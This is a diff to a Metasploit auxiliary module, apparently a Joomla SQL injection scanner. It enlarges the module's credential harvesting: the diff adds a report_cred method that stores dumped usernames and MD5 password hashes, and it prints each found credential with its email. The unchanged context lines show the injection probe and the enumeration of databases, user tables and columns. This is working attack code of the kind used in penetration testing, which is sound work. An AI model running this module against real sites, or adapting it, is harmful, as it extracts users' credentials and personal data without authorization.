@@ -37,6 +37,46 @@ class Metasploit4 < Msf::Auxiliary
       ], self.class)
   end
 
+  def print_good(message='')
+    super("#{rhost}:#{rport} - #{message}")
+  end
+
+  def print_status(message='')
+    super("#{rhost}:#{rport} - #{message}")
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: ssl ? 'https' : 'http',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user]
+    }.merge(service_data)
+
+    if opts[:password]
+      credential_data.merge!(
+        private_data: opts[:password],
+        private_type: :nonreplayable_hash,
+        jtr_format: 'md5'
+      )
+    end
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: opts[:status],
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def check
     flag = Rex::Text.rand_text_alpha(5)
     payload = "0x#{flag.unpack('H*')[0]}"
@@ -71,6 +111,7 @@ class Metasploit4 < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path, 'index.php'),
       'vars_get'  => get,
     })
+
 
     if res && res.code == 200
       cookie = res.get_cookies
@@ -107,7 +148,7 @@ class Metasploit4 < Msf::Auxiliary
     0.upto(dbc.to_i - 1) do |i|
       dbname = sqli(query_fmt % i)
       dbs << dbname
-      vprint_good(dbname)
+      vprint_good("Found database name: #{dbname}")
     end
 
     %w(performance_schema information_schema mysql).each do |dbname|
@@ -133,7 +174,7 @@ class Metasploit4 < Msf::Auxiliary
     vprint_status('tables in database: %s' % database)
     0.upto(tbc.to_i - 1) do |i|
       tbname = sqli(query_fmt % i)
-      vprint_good(tbname)
+      vprint_good("Found table #{database}.#{tbname}")
       tbs << tbname if tbname =~ /_users$/
     end
     tbs
@@ -144,7 +185,7 @@ class Metasploit4 < Msf::Auxiliary
     query = "(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{database}.#{table})"
 
     colc = sqli(query)
-    vprint_status(colc)
+    vprint_status("Found Columns: #{colc} from #{database}.#{table}")
 
     valid_cols = [   # joomla_users
       'activation',
@@ -181,6 +222,19 @@ class Metasploit4 < Msf::Auxiliary
         end
       end
       cols << record
+
+      unless record['username'].blank?
+        print_good("Found credential: #{record['username']}:#{record['password']} (Email: #{record['email']})")
+        report_cred(
+          ip: rhost,
+          port: datastore['RPORT'],
+          user: record['username'].to_s,
+          password: record['password'].to_s,
+          status: Metasploit::Model::Login::Status::UNTRIED,
+          proof: record.to_s
+        )
+      end
+
       vprint_status(record.to_s)
     end
     cols
